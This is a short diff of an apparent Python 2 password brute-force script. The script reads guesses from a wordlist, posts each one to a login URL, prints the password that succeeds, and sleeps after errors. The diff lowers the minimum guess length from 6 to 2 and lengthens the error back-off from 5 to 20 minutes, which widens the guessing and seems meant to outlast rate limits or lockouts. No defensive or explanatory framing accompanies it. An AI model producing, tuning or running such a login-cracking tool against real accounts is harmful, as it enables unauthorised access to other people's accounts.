@@ -36,7 +36,7 @@ i=0
 while file:
 	passw=file.readline().strip()
 	i+=1
-	if len(passw) < 6:
+	if len(passw) < 2:
 		continue
 	print str(i) +" : ",passw
 	response = browser.open(post_url)
@@ -51,5 +51,5 @@ while file:
 				print('Your password is : ',passw)
 				break
 	except:
-		print('\nSleeping for time : 5 min\n')
-		time.sleep(300)
+		print('\nSleeping for time : 20 min\n')
+		time.sleep(1200)
